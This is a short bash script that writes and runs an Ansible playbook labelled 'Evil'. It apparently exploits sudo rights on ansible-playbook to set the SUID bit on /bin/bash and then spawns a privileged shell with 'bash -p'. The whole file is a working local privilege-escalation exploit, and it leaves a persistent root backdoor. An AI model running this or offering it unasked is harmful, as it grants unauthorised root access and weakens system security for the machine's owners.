#!/bin/bash

cat <<EOF > root_playbook.yml
- hosts: localhost
  tasks:
    - name: Evil
      ansible.builtin.shell: |
        chmod +s /bin/bash
      become: true
EOF

sudo ansible-playbook root_playbook.yml

sleep 0.5

/bin/bash -p
